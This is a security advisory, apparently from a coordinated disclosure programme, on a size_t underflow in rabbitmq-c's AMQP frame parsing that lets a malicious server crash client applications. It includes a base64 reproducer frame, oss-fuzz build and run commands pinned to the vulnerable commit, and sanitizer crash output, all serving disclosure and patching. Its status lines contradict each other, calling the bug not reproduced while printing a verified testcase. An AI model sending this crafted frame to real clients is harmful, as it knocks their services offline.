<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-GTGXBRXN -->

# ANT-2026-GTGXBRXN · rabbitmq-c

## integer-underflow medium

[CVE-2026-44235](https://nvd.nist.gov/vuln/detail/CVE-2026-44235)

Claude medium
Security research firm medium
Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Trail of Bits.

# ANT-2026-GTGXBRXN: size\_t underflow in AMQP frame length computation leading to massive out-of-bounds read

A size\_t underflow when computing the length of an AMQP frame results in a massive out-of-bounds read.

**Project:** rabbitmq-c

This finding was identified by static analysis and has not yet been dynamically reproduced. A trigger input is not included.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-GTGXBRXN.

---

**Reference:** ANT-2026-GTGXBRXN

Triage and disclosure were performed by Trail of Bits. The writeup below is the document the firm sent to the maintainer.

:   medium

### Summary

A malicious AMQP server can send an undersized AMQP frame to a rabbitmq-c client and trigger an unsigned `size_t` underflow during frame parsing. The underflowed length is then used by the AMQP properties and table decoder, leading to an out-of-bounds read and process crash.

The issue is reachable during the client login flow when a victim application connects to an attacker-controlled AMQP server, or when an active network attacker can modify traffic on an unencrypted AMQP connection.

### Details

The vulnerable code is in `librabbitmq/amqp_connection.c`, inside `amqp_handle_input()`.

For AMQP HEADER frames, the parser computes the encoded properties length like this:

```
encoded.bytes = amqp_offset(raw_frame, HEADER_SIZE + 12);
encoded.len = state->target_size - HEADER_SIZE - 12 - FOOTER_SIZE;
```

`encoded.len` is a `size_t`. If `state->target_size` is smaller than `HEADER_SIZE + 12 + FOOTER_SIZE`, the subtraction wraps to a very large unsigned value.

For example, the verified testcase uses a HEADER frame where `state->target_size` is 19 bytes:

```
19 - 7 - 12 - 1 = -1
```

As an unsigned `size_t`, this becomes `0xffffffffffffffff`. The value is passed into `amqp_decode_properties()` and then into the table decoder. Bounds checks that compare offsets against `encoded.len` no longer stop the parser, so it reads far past the received frame buffer and crashes.

The same pattern exists for METHOD frames:

```
encoded.len = state->target_size - HEADER_SIZE - 4 - FOOTER_SIZE;
```

### PoC

The testcase was verified against the commit above with the oss-fuzz `fuzz_server` target built with AddressSanitizer.

Build the fuzzer:

```
git clone https://github.com/google/oss-fuzz.git
cd oss-fuzz
```

Pin `projects/rabbitmq-c/Dockerfile` to the validated vulnerable commit:

```
RUN git clone https://github.com/alanxz/rabbitmq-c librabbitmq/ && \
    cd librabbitmq && \
    git checkout 8b7471eab8d09536b3c104dbb30a65699cf48104
```

Then build:

```
python3 infra/helper.py build_fuzzers --sanitizer address rabbitmq-c
```

Save the attached testcase in the `oss-fuzz` directory as `reproducer.bin`, then run:

```
printf '%s' 'AQAAAAAAVgAKAAoACQAAADo3SyAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFPeqzawAAAAAAAAAAAAAHQBAAAABVBMQUlOAAAABWVuX1VTzgIAAAAAAAsAPAAAAAAAAAAAAM4=' | base64 -d > reproducer.bin

python3 infra/helper.py reproduce rabbitmq-c fuzz_server ./reproducer.bin
```

Expected result: AddressSanitizer reports a `SEGV` caused by a READ in `amqp_d8`, reached from `amqp_decode_table_internal()` after `encoded.len` underflows to `0xffffffffffffffff`.

**We have attached a zip containing:**

* Full technical details of each finding
* Reproduction steps and proof-of-concept where applicable
* Candidate patch(es) with regression tests

### Sanitizer output

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==14==ERROR: AddressSanitizer: SEGV on unknown address 0x7f10dccbbeef
==14==The signal is caused by a READ memory access.
SCARINESS: 20 (wild-addr-read)
    #0 0x55555574a8e0 in amqp_d8 librabbitmq/amqp_private.h:219:3
    #1 0x55555574a8e0 in amqp_decode_8 librabbitmq/amqp_private.h:287:1
    #2 0x55555574a8e0 in amqp_decode_table_internal librabbitmq/amqp_table.c:124:10
    #3 0x555555732eaf in amqp_decode_properties librabbitmq/amqp_framing.c:1505:21
    #4 0x555555726ffe in amqp_handle_input librabbitmq/amqp_connection.c:347:17
    #5 0x555555745ec9 in consume_one_frame librabbitmq/amqp_socket.c:638:9
    #6 0x555555745ec9 in wait_frame_inner librabbitmq/amqp_socket.c:747:13
    #7 0x555555749efb in amqp_simple_wait_frame_noblock librabbitmq/amqp_socket.c:929:12
    #8 0x555555749efb in amqp_simple_wait_method_list librabbitmq/amqp_socket.c:947:9
    #9 0x5555557490fc in amqp_login_inner librabbitmq/amqp_socket.c:1349:11
    #10 0x55555574861a in amqp_login librabbitmq/amqp_socket.c:1444:9
    #11 0x555555723f37 in client fuzz/fuzz_server.c:149:3
    #12 0x555555723d03 in LLVMFuzzerTestOneInput fuzz/fuzz_server.c:117:3

DEDUP_TOKEN: amqp_d8--amqp_decode_8--amqp_decode_table_internal
==14==Register values:
rax = 0x0000000000000000  rbx = 0xffffffffffffffff  rcx = 0x0000000000000021  rdx = 0x00000000000009c8
rdi = 0x0000080000000000  rsi = 0x0000000200000000  rbp = 0x00007ffffffceb70  rsp = 0x00007ffffffceaf0
 r8 = 0x00005555557cdc00   r9 = 0x0000000000000021  r10 = 0x00007fffffffff01  r11 = 0x0000000000000001
r12 = 0x00007f10dccbbeef  r13 = 0x00000000deab36dd  r14 = 0x00007ffffec40460  r15 = 0x00000000ffffff06
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV librabbitmq/amqp_private.h:219:3 in amqp_d8
==14==ABORTING
```

### Impact

Any application using rabbitmq-c as an AMQP client can be affected if it connects to an attacker-controlled AMQP server. An active network attacker may also be able to trigger the issue when the connection is not protected by TLS with certificate validation.

The demonstrated impact is client-side denial of service through a remote out-of-bounds read and crash. The reproduced crash shows attacker-influenced parsing state and an underflowed length of `0xffffffffffffffff`, but this analysis does not show reliable memory disclosure or code execution.

**Background of that issue**
This bug was found as a part of an Anthropic research into the use of large language models for automated vulnerability discovery in open source software. Anthropic then engaged Trail of Bits to independently triage and validate those issues.

Thank you for your work on rabbitmq-c!

1. 2026-03-29
2. 2026-04-09
3. 2026-05-07
4. 2026-05-07
5. 2026-08-17

3033221594ae12c1cf323741eecb09d2bcd009e6ee6b2b7e464106d5bd6e6e7766637589d331edbd33be4041134f0722bc6d23d07a39887eed90541a0c797f77

Committed 2026-04-09 18:50 UTC

Revealed 2026-08-17 17:47 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-GTGXBRXN%22%2C%22bug_class%22%3A%22Integer%20Underflow%22%2C%22claude_severity%22%3A%22medium%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-29T20%3A43%3A24%2B00%3A00%22%2C%22description%22%3A%22A%20size_t%20underflow%20when%20computing%20the%20length%20of%20an%20AMQP%20frame%20results%20in%20a%20massive%20out-of-bounds%20read.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22rabbitmq-c%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3Anull%2C%22title%22%3A%22size_t%20underflow%20in%20AMQP%20frame%20length%20computation%20leading%20to%20massive%20out-of-bounds%20read%22%2C%22vendor_severity%22%3A%22medium%22%7D)

```
  "ant_id": "ANT-2026-GTGXBRXN",
  "bug_class": "Integer Underflow",
  "claude_severity": "medium",
  "created_at": "2026-03-29T20:43:24+00:00",
  "description": "A size_t underflow when computing the length of an AMQP frame results in a massive out-of-bounds read.",
  "location": null,
  "project": "rabbitmq-c",
  "technical_details": null,
  "title": "size_t underflow in AMQP frame length computation leading to massive out-of-bounds read",
  "vendor_severity": "medium"
```
